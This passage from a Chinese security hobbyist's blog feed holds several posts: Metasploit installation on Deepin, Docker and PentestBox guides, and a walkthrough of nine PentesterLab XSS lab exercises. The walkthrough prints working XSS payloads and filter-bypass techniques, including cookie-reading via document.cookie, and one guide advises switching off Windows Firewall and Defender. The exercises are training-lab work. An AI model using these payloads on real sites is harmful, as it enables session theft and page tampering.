内容为刚才生成的密钥，准确的复制这个文件的内容，粘贴到 https://github.com/settings/ssh 的 new SSH key 中 验证是否成功1ssh -T git@github.com 然后 输入yes会看到：1Hi tezukanice! You&apos;ve successfully authenticated, but GitHub does not provide shell access. 这就代表是可以连接到github的了 配置Git个人信息现在已经可以通过 SSH 链接到 GitHub 了，还有一些个人信息需要完善的。Git 会根据用户的名字和邮箱来记录提交。GitHub 也是用这些信息来做权限的处理，输入下面的代码进行个人信息的设置，把名称和邮箱替换成你自己的。12git config --global user.name &quot;tezukanice&quot;git config --global user.email &quot;admin@sqlsec.com&quot; 添加CNAME解析文件在博客目录下的source目录下新建CNAME文件1www.sqlsec.com Hexo-editor简介这是一个本地化Hexo第三方编辑器，完美兼容hexo，支持MarkDown文件实时编写。下面是效果图: 项目地址https://github.com/tajpure/hexo-editor 操作1234git clone https://github.com/tajpure/hexo-editor.gitcd hexo-editornpm install --productionnpm start]]></content>
      <categories>
        <category>others</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>Hexo</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Deepin Linux下的Metasploit安装及优化]]></title>
    <url>%2F2017%2F03%2Fdpmsf.html</url>
    <content type="text"><![CDATA[本文不限于Deepin Linux系统，类似的在ubuntu debian xubuntu等血统类似的Linux发行版中都可以使用这里方法来安装原生的metasploit 前言本文不限于Deepin Linux系统，类似的在ubuntu debian xubuntu等血统类似的Linux发行版中都可以使用这里方法来安装原生的metasploit 配置Kali Linux官方源Kali 官方源这个源是我在Kali 2016.2中提取的原生源，速度很快，会根据具体的网络情况自动去选择最近的更新源服务器进行更新的。12deb http://http.kali.org/kali kali-rolling main contrib non-freedeb-src http://http.kali.org/kali kali-rolling main contrib non-free 把kali的源添加到 Deepin 自带的源后面1234567# vim /etc/apt/sources.list## GGenerated by deepin-installer-reborndeb [by-hash=force] http://ackages.deepin.com/deepin unstable main contrib non-free#deb-src http://packages.deepin.com/deepin unstable main contrib non-free#Kali Linux2016.2deb http://http.kali.org/kali kali-rolling main contrib non-freedeb-src http://http.kali.org/kali kali-rolling main contrib non-free 如下图 更新源1apt-get update 大概3分钟左右可以更新完，然后就可以像Kali Linux一样，任意安装所需要的工具了。 举个例子安装sqlmap1apt-get install sqlmap 就是这种格式apt-get install 软件名强迫症患者可以把Kali Linux下的工具全部搬到 Deepin上面，使用如下命令，安装Kali的全部工具1apt-get install kali-linux-all 然而我看到了要下载这么大的文件～！ 当时就放弃这个想法了，真不清楚Demon他下载了多长时间～～ 细思恐极 安装 Metasploitmetasploit神器级别的工具，怎么错过。Deepin Linux安装metasploit很简单，一条命令即可1apt-get install metasploit-framework 配置postgresql 数据库先切换到root用户，然后再切换到postgresql，然后就进入了数据库管理了1234gg@gg-PC:~$ su 密码：root@gg-PC:/home/gg# su postgrespostgres@gg-PC:/home/gg$ 然后创建metasploit的数据库和用户123createuser msf -P -S -R -D #创建用户 会提示输入密码 createdb -O msf msf #创建数据库 配置metasploit数据库的连接在metasploit的安装目录下新建database.yml文件，内容如下123456789production: adapter: postgresql database: msf username: msf password: gg #我在上一步创建用户的时候 设置的密码 host: 127.0.0.1 port: 5432 pool: 75 timeout: 5 然后在msfconsole下手动连接数据库1234msf &gt; db_connect -y /usr/share/metasploit-framework/databa查看数据库连接状态```rmsf &gt; db_status[*] postgresql connected to msf 解决metasploi搜索缓慢， 调用数据库缓存 实现秒搜索Deepin Linux安装完metasploit后，例行公事 搜索下经典的08-067漏洞攻击模块123456789101112msf &gt; search 08-067[!] Module database cache not built yet, using slow searchMatching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- exploit/windows/smb/ms08_067_netapi 2008-10-28 great MS08-067 Microsoft Server Service Relative Path Stack Corruptionmsf &gt; exit 可以发现第1行就出现了警告：[!] Module database cache not built yet, using slow search大意是没有调用缓存模块，只能使用慢速搜索了～～ ，这怎么能忍？Google查了下资料，解决方法是重启postgresql和重建metasploit缓存 重启postgresql1# etc/init.d/postgresql restart 重新进msf 并重建缓存1234567891011121314151617gg@gg-PC:/usr/share/metasploit-framework$ msfconsole _ _/ \ /\ __ _ __ /_/ __| |\ / | _____ \ \ ___ _____ | | / \ _ \ \| | \/| | | ___\ |- -| /\ / __\ | -__/ | || | || | |- -||_| | | | _|__ | |_ / -\ __\ \ | | | | \__/| | | |_ |/ |____/ \___\/ /\ \\___/ \/ \__| |_\ \___\Validate lots of vulnerabilities to demonstrate exposurewith Metasploit Pro -- Learn more on http://rapid7.com/metasploit =[ metasploit v4.14.2-dev ]+ -- --=[ 1631 exploits - 932 auxiliary - 282 post ]+ -- --=[ 472 payloads - 40 encoders - 9 nops ]+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ] 重建缓存12msf &gt; db_rebuild_cache[*] Purging and rebuilding the module cache in the background... 查看metasploit数据库状态12msf &gt; db_status[*] postgresql selected, no connection 手动连接数据库12msf &gt; db_connect -y /usr/share/metasploit-framework/database.yml[*] Rebuilding the module cache in the background... 再次检验数据库12msf &gt; db_status[*] postgresql connected to msf 然后再次搜索就会发现 搜索速度瞬间上来了没有再报错 数据库缓存没有建立 的错误了 metasploit秒搜效果]]></content>
      <categories>
        <category>others</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>Metasploit</tag>
        <tag>神器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[国光大力推荐(安利)Deepin15.4]]></title>
    <url>%2F2017%2F03%2Fdeepin.html</url>
    <content type="text"><![CDATA[深度操作系统15.4 Beta(deepin15.4)相比deepin15.3来看，外观上要更加优雅。现在还在内测中，相信不就官网就会发布正式版。小子昨天下午删了我的windows10，特意来尝鲜了下deepin15.4.beta 简介深度操作系统15.4 Beta(deepin15.4)相比deepin15.3来看，外观上要更加优雅。现在还在内测中，相信不就官网就会发布正式版。小子昨天下午删了我的windows10，特意来尝鲜了下deepin15.4.beta 官方链接http://www.deepin.org/2017/04/07/detailed-change-log-for-deepin-15-4-rc2/ 简单视频展示 小结新版本deepin15.4在外观上面的的细节做的越来越好了，个人认为颜值现在和以优雅著称的Mac OS可以平起平坐了。 当然我选择Deepin Linux不仅仅是因为她的颜值，更重要的是Deepin15.4是Linux的血统，开发利器，git、wget、vim、jdk等自带，而且在稳定性方面也比windows要好多。当然这不是最重要的，最终要的是没有了windows我就再也无法玩游戏了(手动滑稽)，室友LOL开黑我就可以用没有windows系统的理由强行拒绝了~ 远离了守望先锋~ 远离了GTA5～～～ 这样就会腾出更多的时间来敲代码了。 有志者事竟成，破釜沉舟，百二秦关终属楚新的系统 新的开始～ 彩蛋国光的最后一次录制的GTA5漂移短视频 为什么是最后一次，因为我把GTA5卸载了，腾出空间安装了Deepin~~]]></content>
      <categories>
        <category>others</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>Deepin Linux</tag>
        <tag>diy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pentester中的XSS详解]]></title>
    <url>%2F2017%2F02%2Fpentester.html</url>
    <content type="text"><![CDATA[记录了PentesterLab中的XSS题的解题方法，普及了一些XSS入门知识。本次做的是Web For Pentester靶机里面的XSS题目，一共有9道题目。关于靶机搭建参考这篇文章:渗透测试靶机的搭建本次做的是Web For Pentester靶机里面的XSS题目，一共有9道题目。关于靶机搭建参考这篇文章:渗透测试靶机的搭建 第1题(无过滤措施)首先在后面输入xss:http://10.211.55.16/xss/example1.php?name=xss看到如下页面：然后查看下源码:感觉这里没有任何的防御措施，忍不住笑出了声。有很多的标签里面都可以调用HTML的事件属性来弹窗，为了节约时间，下面我就列举出一些比较常用的手法。 利用基本的script标签来弹窗Payload1&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt; 定义和用法script 标签用于定义客户端脚本，比如 JavaScript。 效果图 利用iframe标签的的src属性来弹窗Payload1&lt;iframe src=javascript:alert(&apos;xss&apos;)&gt;&lt;/iframe&gt; 定义和用法iframe 元素会创建包含另外一个文档的内联框架（即行内框架）。 效果图 利用标签的href属性来弹窗Payload1&lt;a href=javascript:alert(&apos;xss&apos;)&gt;ggtest&lt;/a&gt; 这里就是超链接到了:javascript:alert(&#39;xss&#39;)效果和浏览器直接打开这个地址:javascript:alert(&#39;xss&#39;)是一样的这里还可以使用：javascript:alert(document.cookie) 来弹出当前会话的cookie 定义和用法 标签定义超链接，用于从一张页面链接到另一张页面。 元素最重要的属性是 href 属性，它指示链接的目标。指向国光博客的一个例子：1&lt;a href=&quot;http://git.sqlsec.com”&gt;国光博客&lt;/a&gt; 效果图 利用标签来弹窗Payload1&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt; 这里的src后面是填写的 是 图片的地址，为了 测试简便 这个地址里面我们一般随便填写,比如这里我们填写的就是 1，因为1不是一个正确的值，所以 触发了后面的 onerror事件（遇到错误 就触发）当然如果在src里面填写一个正常的URL的话，就不会弹窗的了，因为onerror的触发条件是得报错。当src后面的值是正确的时候呢，这个还可以用 oneclick事件来触发弹窗1&lt;img src=http://www.sqlsec.com/favicon.ico onclick=alert(&apos;xss&apos;)&gt; 这里不论src后面的值 是否正确，只要鼠标点击，就会触发 弹窗事件。类似onerror和onclick的时间有很多种下面 列举出常见的事件Windows事件属性 事件 作用 onerror 在错误发生时运行的脚本 onload 页面结束加载之后触发 Keyboard 事件 事件 作用 onkeydown 在用户按下按键时触发 onkeypress 在用户敲击按钮时触发 onkeyup 当用户释放按键时触发 鼠标（Mouse）事件 事件 作用 onclick 元素上发生鼠标点击时触发 onmousedown 当元素上按下鼠标按钮时触发 onmousemove 当鼠标指针移动到元素上时触发。 onmouseover 当鼠标指针移动到元素上时触 onmouseout 当鼠标指针移出元素时触发 onmouseup 当在元素上释放鼠标按钮时触发 定义和用法img 元素向网页中嵌入一幅图像。请注意，从技术上讲， 标签并不会在网页中插入图像，而是从网页上链接图像。 标签创建的是被引用图像的占位空间。 标签有两个必需的属性：src 属性 和 alt 属性 凡是支持事件的HTML标签都是可以弹窗的，在HTML中支持事件属性的标签很多，下面我就 列举出一些支持事件的HTML常见标签 标签 作用 a 定义超链接，用于从一张页面链接到另一张页面,最重要的属性是 href 属性，它指示链接的目标 article 规定独立的自包含内容一篇文章应有其自身的意义，应该有可能独立于站点的其余部分对其进行分发 audio 定义声音，比如音乐或其他音频流 b 规定粗体文本 body 定义文档的主体，包含文档的所有内容 br 只是简单地开始新的一行 button 定义一个按钮 iframe 会创建包含另外一个文档的内联框架 img 向网页中嵌入一幅图像 select 可创建单选或多选菜单 style 用于为 HTML 文档定义样式信息 textarea 标签定义多行的文本输入控件 video 定义视频，比如电影片段或其他视频流 第一题因为没有任何的过滤，所以理论上支持调用HTML事件属性的标签都是可以成功弹窗的，下面来个 综合点的payload123http://10.211.55.16/xss/example1.php?name=&lt;button type=&quot;button&quot; onclick=alert(&apos;xss&apos;)&gt;通过按钮点击触发xss&lt;/button&gt; &lt;font size=&quot;4&quot; color=&quot;blue&quot; onmouseover=alert(&apos;xss&apos;)&gt; 移动到元素触发xss &lt;/font&gt; &lt;br&gt; &lt;select&gt; &lt;option onclick=alert(&apos;x&apos;)&gt;onclick点击触发事件&lt;/option&gt; &lt;option values=1 onmousedown=alert(&apos;ss&apos;)&gt;onmousedown触发&lt;/option&gt;&lt;/select&gt; &lt;a href=javascript:alert(&apos;xss&apos;)&gt;利用a标签的href属性触发&lt;/a&gt; &lt;br&gt;&lt;textarea placeholder=国光的xss测试：键盘按键触发xss onkeypress=alert(&apos;xss&apos;)&gt;&lt;/textarea&gt; 第2题(大小写转换)这一题的话， 除了&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;这个payload,其他用第一题中的其他payload:1234&lt;iframe src=javascript:alert(&apos;xss&apos;)&gt;&lt;/iframe&gt;&lt;a href=javascript:alert(&apos;xss&apos;)&gt;ggtest&lt;/a&gt;&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;... 依然还是可以的，好吧，为了不这么容易做完这道题目，我们来下面的题目都尽量使用&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;来试试看查看下源码:这里我们猜测过滤&lt;script&gt;和&lt;/script&gt;然后这里尝试下大小写转换，尝试着绕过过滤：1&lt;Script&gt;alert(&apos;xss&apos;)&lt;/scripT&gt; 可以看到成功绕过了: 第3题(嵌套构造)直接输入1&lt;Script&gt;alert(&apos;xss&apos;)&lt;/scripT&gt; 发现大小写转换的这个套路已经不能够使用了得到结论是:没有过滤alert(‘xss’),现在就把注意力集中在 &lt;script&gt; 和&lt;/script&gt;上Fuzz测试一下，看看具体过滤了哪些字符？然后再想办法绕过。1http://10.211.55.16/xss/example3.php?name=&lt;&gt;&lt;/&gt;script&lt;script&gt; 可以看出过滤了:&lt;/script&gt;和&lt;script&gt;尝试构造输入:1http://10.211.55.16/xss/example3.php?name=&lt;sc&lt;script&gt;ript&gt; 查看源码后发现成功构造出 1&lt;script&gt; 于是判断这里只顾虑了一次，接着尝试构造如下完整的payload: 1http://10.211.55.16/xss/example3.php?name=&lt;sc&lt;script&gt;ript&gt;alert(&apos;xss&apos;)&lt;/s&lt;/script&gt;cript&gt; 第4题(利用标签绕过) 直接输入:&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;发现直接 error 了 于是再次出尝试输入： 1http://10.211.55.16/xss/example4.php?name=&lt;&gt;alert(&apos;xss&apos;)&lt;/&gt; 再次得出结论:没有过滤&lt;&gt; &lt;/&gt; alerrt(&#39;xss&#39;),现在主要想办法对script做个处理来绕过过滤。 然而我各种编码都没有绕过，有的编码的确是绕过了，但是貌似没有解析脚本 =,= 哎~~~放弃用这种形式的&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;的payload了，于是乎使用下面的&lt;img&gt;标签成功绕过： 1&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt; 第5题(String.fromCharCode编码绕过) 首先执行: 1&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt; 发现直接就 报 error了，于是fuzz测试发现并没有过滤:&lt;script&gt;和&lt;/script&gt; 只是过滤了:alert 利用火狐浏览器的hackbar插件对alert(&#39;xss&#39;)进行String.fromCharCode转换: 1&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59))&lt;/script&gt; 第6题(闭合标签) 首先默认查看下源码: 发现我们输出的hacker作为了一个变量赋值给了a，并且这个变量在&lt;script&gt;这个标签中 这样的话，只要能够突破这个赋值的变量，就可以利用这个&lt;script&gt;这个标签来弹窗了。 下面想办法闭合进行fuzz测试…… 这里边看源码边做调整。几次测试后得到如下可以弹窗的payload: 111&quot;;&lt;/script&gt;&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;&lt;script&gt; 来查看下源码来简单的分析一下:12345678Hello &lt;script&gt; var $a= &quot;11&quot;;&lt;/script&gt;&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;&lt;script&gt;&quot;;&lt;/script&gt; &lt;footer&gt; &lt;p&gt;&amp;copy; PentesterLab 2013&lt;/p&gt; &lt;/footer&gt; pauyload最前面的11&quot;;&lt;/script&gt; 闭合了前面的&lt;script&gt;标签最后面的&lt;script&gt; 闭合了后面的&lt;script&gt;标签中间的1&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt; 用来触发 弹窗事件 第7题首先来查看下源码:感觉貌似和第6题差不多，于是稍微修改了下使用下面的payload来进行测试:1hacker&apos;;&lt;/script&gt;&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;&lt;script&gt; 结果并没有弹窗，赶紧查看下源码压压惊:可以看到对输入的 &lt;和/和&gt;符号进行转义了，导致我们的弹窗失败。所以现在的着重点就是 如何处理这些符号:&lt;和/和&gt;然而我失败了，对这些符号进行转码也是失败了，后来想了好久终于知道问题所在了:受到以前闭合一句话木马的缘故,我老是想着闭合首尾的标签后来仔细想想，这个变量 就在&lt;script&gt;里面，可以在里面直接写alert(‘xss’)来弹窗的，这样也就不需要使用&lt;和/和&gt;特殊符号了。这么看来的话，第6题 也应该这么来做，奇葩的我，居然是闭合的方式来弹窗的….1http://10.211.55.16/xss/example6.php?name=name=&quot;;alert(&apos;xss&apos;);var b=&quot; 查看下源码:12345678Hello &lt;script&gt; var $a= &quot;name=&quot;;alert(&apos;xss&apos;);var b=&quot;&quot;;&lt;/script&gt; &lt;footer&gt; &lt;p&gt;&amp;copy; PentesterLab 2013&lt;/p&gt; &lt;/footer&gt; 这里 巧妙的利用了 ; 来在&lt;script&gt;标签里面执行alert(&#39;xss&#39;) 第8题是一个输入框,然后输入payload:&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;；来试试看,查看源码：1234567HELLO &amp;lt;img src=1 onerror=alert(&apos;xss&apos;)&amp;gt;&lt;form action=&quot;/xss/example8.php&quot; method=&quot;POST&quot;&gt; Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt; &lt;footer&gt; &lt;p&gt;&amp;copy; PentesterLab 2013&lt;/p&gt; &lt;/footer&gt; 发现也是对 &lt; &gt; 标签进行转义了，这里进行各种编码也没有绕过。又是好久也没有成功突破，最后仔细看源码，发现突破点在于1&lt;form action=&quot;/xss/example8.php&quot; 这是第8题的URL,于是注意力转移到URL处，尝试在URL后面添加1http://10.211.55.16/xss/example8.php/ 查看源码：发现我们最后添加的 :/ 写在了&lt;form&gt;这个标签中，于是在这里进行fuzz测试，尝试闭合标签，最后构造的payload如下：1http://10.211.55.16/xss/example8.php/&quot;&gt;&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;&lt;form 来查看下源码来分析刚刚构造的payload:123&lt;form action=&quot;/xss/example8.php/&quot;&gt;&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;&lt;form&quot; method=&quot;POST&quot;&gt; Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt; 可以看到这里/&quot;闭合了最前面的&lt;form&gt;&lt;form&gt; 闭合了最后面的/&gt;中间的&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt; 触发了弹窗事件 第9题这一题很特殊，不愧是大boss，这里首先查看下源码:在源码中完全找不到hacker的任何字样，于是仔细百度最可疑的地方:123&lt;script&gt; document.write(location.hash.substring(1));&lt;/script&gt; 找到一份资料：http://www.runoob.com/jsref/prop-loc-hash.html这里可以大概看出这里是读取#后面的东西，于是乎简单的在#后面构造xss语句:1http://10.211.55.16/xss/example9.php#&lt;img src=http://www.sqlsec.com/favicon.ico onclick=alert(&apos;Bingo&apos;)&gt; 最后一道题目了，得录制个gif来庆祝一下： 小结虽然这个平台只有9道题目，但是用心去整理拓展，发现可以学到很多xss的姿势，这样又把以前快忘记的xss姿势巩固提高了一下，更好的为不久后挖BAT的XSS漏洞做好基础知识的准备。]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker入门简明教程]]></title>
    <url>%2F2017%2F01%2Fdocker.html</url>
    <content type="text"><![CDATA[Docker是基于Go语言实现的云开源项目，是基于Linux的多项开源技术提供高效、敏捷和轻量级的容器方案。创建于2013年初。自从开源后就受到了广泛的关注，从长远的眼光来看，Docker是未来虚拟化的一个发展的趋势。带来了更轻量快捷的的体验，一台主机可以同时运行数千个Docker容器，而且在性能上几乎不会损耗。 Docker简介概念Docker是基于Go语言实现的云开源项目，是基于Linux的多项开源技术提供高效、敏捷和轻量级的容器方案。创建于2013年初。自从开源后就受到了广泛的关注，从长远的眼光来看，Docker是未来虚拟化的一个发展的趋势。 优势1.一次构建，处处运行，带来了更快速的交付和部署和更轻松的迁移和扩展。2.对系统内核进行抽象，带来了更轻量快捷的的体验，一台主机可以同时运行数千个Docker容器，而且在性能上几乎不会损耗。Docker1.1.2中Ubuntu14.04主机与Ubuntu14.04Docker容器性能测试 参数 性能测试工具 物理主机 Docker CPU sysbench 1 0.9945 写内存 sysbench 1 0.9826 读内存 sysbench 1 1.0025 磁盘I O dd 1 0.9811 网络 iperf 1 0.9626 从数值上看，物理主机与Docker容器之间的性能差异不大，二者速度几乎一样。 基本组件镜像:镜像是构建Docker世界的基石。用户的一切操作都是基于镜像来运行自己的容器的。同时镜像也是Docker的“构建”部分，也可以把镜像当作容器的”源代码”，镜像体积很小，便携性高，易分享、存储和更新。容器:容器是基于镜像启动起来的，用户只需要把自己的应用程序或服务打包放进容器即可。容器中可以运行一个或多个进程，是Docker的启动和执行阶段。 Docker安装安装Docker的前提条件运行64位CPU架构的计算机（这意味着一些较老的机器可能无法安装Docker）Linux系统的话，得运行Linux3.8内核及其以上的版本，一些老版本的2.6x内核运行可能会出现一些无法预料的bug windows安装Dokcer官网直接下载安装包: https://download.docker.com/win/stable/InstallDocker.msi然后直接运行来安装Docker，开启Hyper-V(这个阶段可能需要重启),有可用更新的话，就安装 更新。小提示:windows下的Docker启动貌似有点慢，不知道是不是我这龟速的机械硬盘的原因。dokcer完全启动后，是这样样子的：验证docker是否安装成功:在命令提示符下输入:docker出现下面这张图即安装成功: Mac OS安装Docker首先安装Virtual Box，官网下载：https://www.virtualbox.orgVirtual box安装完了再安装DockerDocker官网直接下载安装包: https://download.docker.com/mac/stable/Docker.dmgMac下安装启动就很快了。然后在终端下输入：1docker 注意:Mac和Linux下必须得以==root==身份才可以稳定运行docker,效果如下: Ubuntu安装DockerLinux安装要简单的多，毕竟Docker一开始就是基于Linux提出来的。首先以root身份终端下输入：1apt-get install docker.io 然后就没有然后了，1条命令即可安装root身份终端下输入：docker查看安装是否成功： Dokcer入门搜索镜像Dokcer通过Dokcer Hub搭建镜像共享生态系统，这意味着我们可以直接下载其他人已经打包好的镜像。使用docker search 命令在Docker HUB中搜索镜像这里我们以搜索Ubuntu镜像为例：1docker search ubuntu 一般我们下载靠前面的镜像，一般带有Ubuntu、centos并且靠前的镜像都是官方镜像，其他的都是用户自己创建并共享的镜像。 下载镜像下面从Docker Hub下载Ubuntu镜像终端输入：1docker pull ubuntu Docker默认是下载最新版本的Ubuntu镜像镜像一般都很小的，网速快的话可以分分钟下载完。 列出下载的镜像下面列出本地主机中已经下载的docker镜像 终端输入： 1docker images 可以看到我们刚刚下载的Ubuntu镜像，大小才129MB,是4周前更新的版本 创建并使用容器使用run命令即可用镜像来创建一个容器123456docker run -i -t --name hellodocker ubuntu /bin/bash命令格式为：docker run &lt;选项参数&gt; &lt;镜像名称&gt; &lt;要运行的文件&gt;&gt;使用 -i、-t选项可以在运行的Bash shell中进行输入与输出&gt;使用—name可以指定容器的名称。如果不指定的话，docker默认会自动生成随机的名称进行指定。 再回看这行命令大概就明白了它的意思：使用ubuntu这个镜像来创建一个 名为hellodocker 的容器当我们创建容器后，默认就进入了容器，此时使用cd、ls等命令发现已经不是我们物理机上的ubutu了。 退出容器终端输入:1exit 从Bash shell退出，因为在Ubuntu镜像中直接运行/bin/bash 可执行文件，所以退出后 容器也会终止（stop）就这样我们创建运行并退出了一个容器，现在自己再亲手创建个容器试试看吧.-v- 查看容器列表终端输入:1docker ps -a 查看本地的所有容器的详细信息可以看到，除了我们第一个创建的名为 hellodocker外，还发现了我后来新建的GG容器，他们都是Exited(退出状态)，这里还可以看到他们的ID、所使用的镜像、创建时间、端口等信息 使用start命令来启动容器到这里机智的小伙伴们可能产生疑问了：第一次创建容器是默认就进入了容器，那么在我们 exit 退出容器之后如何唤醒我们的容器呢？表急，其实docker早已考虑到了这个，我们在终端下输入：1docker start hellodocker 来启动名为hellodocker的容器,所以启动docker容器的命令就是：1docker start 容器名 来启动名为hellodocker的容器,所以启动docker容器的命令就是：1docker start 容器名 使用restart命令来重启容器与重启系统一样，也可以直接使用如下命令来重启某个容器：1docker restart hellodocker 使用attach命令连接容器前面我们start了一个容器，但是还是默认不进入容器，我们使用1docker ps -a 来查看容器的运行情况：可以看到hellodocker这个容器已经启动了4秒多了，说明容器已经在运行了，那么我们怎么来连接启动的docker容器呢？终端输入：1docker attach hellodocker 来连接已经在后台启动的docker容器小提示:这里得 按下 回车 才进入容器，不要傻等，几分钟内都没有什么反应的（不要问我怎么知道的，心酸。。。） Docker系统统计信息终端下输入:1docker stats 用来显示一个或多个容器的统计信息，可以看到容器的ID、CPU占用率、内存使用率、网速等信息 终止容器要终止容器的话，首先docker ps -a列出后台正在运行的容器然后终端输入：1docker stop hellodocker 终止了我们刚启动不久的hellodocker 容器 删除容器如果容器不再使用可以使用如下命令删除:1docker rm GG 删除了GG的容器（你要删除的容器必须已经停止运行了） 删除镜像如果镜像不再使用可以使用如下命令删除：1docker rmi ubuntu 删除了本地的ubuntu镜像（此刻必须删除所有运行在这个镜像上的容器）OK Docker的入门命令就教到这里了，下面我们来实战一把吧。 打造属于你自己的Kali一般我们搞信息安全的难免都会用到Kali Linux,如果不想安装累赘的虚拟机或者不想折腾更新源等那么该肿么办呢？现在有了Docker，这一切的问题都不再是问题，使用Docker来运行Kali，更加轻便快捷，而且可以ping通物理机的C段，用来实战的话再合适不过了。秀个主题先：安装了Mac OS的主题后，Ubuntu也感觉不再那么难用了。（嘿嘿 不扯了 赶紧步入正题了） 首先搜索下可用的Kali镜像1docker search kali 出来了一大堆，根据名字可以大概判断出第二个镜像是带有meatsploit的，所以为了日后配置的方便我们这里直接来下载第二个镜像。 下载Kali 镜像1docker pull linuxkonsult/kali-metasploit 下载带有msf的kali镜像（镜像不大，我这边下载完不到10分钟） 创建Kali 容器1下载带有msf的kali镜像（镜像不大，我这边下载完不到10分钟） 用下载的kali镜像创建个名为msfkali的容器 进入容器查看基本信息可以看到kali使用的是默认源，这里我要说一下，kali 2016.X版本的kali使用这个默认官方源就好，这个默认的官方源会自动选择速度最快的镜像站点来下载的，切记：==不要换这个更新源==。123root@42e13a2e4c0d:/# cat /etc/apt/sources.listdeb http://http.kali.org/kali kali-rolling main contrib non-freedeb-src http://http.kali.org/kali kali-rolling main contrib non-free 终端输入:1msfconsole 可以看到默认是带metasploit的，看来我们之前猜的没错除此之外还带了nmap、wget、git等但是这些工具还不够我们完成一次渗透测试 安装自己需要的工具首先先刷新下更新缓存列表：1apt-get update 然后就可以直接安装工具了1apt-get install 工具名 这里你需要什么工具就安装什么工具，速度很快的，用什么就安装什么，没有什么比这个更DIY的了。举个例子：你想安装个aircrack来破解WiFi密码，那么就直接：1apt-get install aircrack-ng 总之，这个Kali Docker就是Kali的命令行，和正常是Kali一模一样，该怎么折腾就怎么折腾吧。小结：Docker从长远眼光来看是一个趋势，虽然起初刚刚学习需要投入些时间，但是当你熟练Docker的时候，才会发现它的真正强大之处，从现在来看已经可以完全替代PentestBox了，当然Docker的作用不仅仅这么简单，博客以后会继续更新Docker更加深入的文章的。 Mac OS下Kali Docker效果演示]]></content>
      <categories>
        <category>others</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>虚拟化</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PentestBox简明使用教程]]></title>
    <url>%2F2016%2F11%2Fpentestbox.html</url>
    <content type="text"><![CDATA[顾名思义，这是一个渗透工具包，但是不同于绝大多数国内xx工具包的是，这里集成的大都是Linux下的工具,Kali Linux上面的常用的很多工具这里面也都集成了。PentestBox是一款Windows平台下预配置的便携式开源渗透测试环境。 它打包了所有的安全工具，并且可以在Windows系统中原生地运行，有效地降低了对虚拟机或者双启动环境的需求。 介绍PentestBox：渗透测试盒子 顾名思义，这是一个渗透工具包，但是不同于绝大多数国内xx工具包的是，这里集成的大都是Linux下的工具,Kali Linux上面的常用的很多工具这里面也都集成了。PentestBox官网：https://pentestbox.org/zh/官方的介绍如下：PentestBox是一款Windows平台下预配置的便携式开源渗透测试环境为什么又有一个渗透测试环境？PentestBox不同于运行在虚拟机或者双启动环境的Linux渗透测试发行版。它打包了所有的安全工具，并且可以在Windows系统中原生地运行，有效地降低了对虚拟机或者双启动环境的需求。我们发现超过50%的渗透测试发行版是运行在Windows系统下的虚拟机程序中，这激发我们创造了它。 安装官网 提示：按照带有metasploit 的版本的时候得关闭windows自带的防火墙,因为metasploit生成的攻击载荷 对于 windows的安全来说 是个威胁。所以得关闭winows的防火墙。Windows7直接在控制面板里面 关闭防火墙即可：Windows 10的话，除了关闭上述的防火墙 还得关闭 Windows Defender在windows 自带的 设置-更新和安全-Windows Defender 中关闭。注意 如果没有关闭防火墙的话，PentestBox安装的过程中释放的文件 会直接被 防火墙 悄悄的干掉，如果这样的话 就非常的尴尬了，所以 为了方便，建议开始的时候直接关闭防火墙。直接运行 文件 选择安装的文件位置路径，即可安装，安装其实就是文件的释放，最后整个文件夹大小为4.55GB左右所以我们可以直接 把PentestBox安装在移动硬盘或者 U盘中，这样就打造了移动渗透工具的平台了，在任意的windows系统上运行，这就比Kali 的Live U盘要方便许多 基本文件结构PentestBox共5个文件夹,2个库文件，一个bat批处理和一个exe启动程序。bat和exe都可以启动PentestBoxbase文件夹：里面放了一些工具需要用到的环境变量文件，如：python 、jdk等bin文件夹：里面的工具基本上足够满足日常的渗透测试要求了 基本操作软件安装1终端下输入：toolsmanager 打开工具管理器，在这里可以 安装/升级/卸载 软件首先，它会从GitHub的信息库自动更新，然后会显示菜单。如果没有互联网连接，脚本会等待一段时间，然后显示菜单。如下图：1可以通过选择编号进入相关的模块。例如，如果我选择了Web应用程序类别，然后按10，它会显示： 1234在这里面 我们就可以安装 这里面列出的工具。现在，如果你想安装imagejs然后键入install imagejs它会安装它。安装后，重启 PentestBox，你所安装的工具会生效。 可以用toolsmanager安装的软件列表，具体见这里 modules.pentestbox.com 软件更新123安装软件就酱紫了，如果要更新的话，这里直接输入编号 11 Update all installed Modules 这里就开始更新已经安装的工具了： 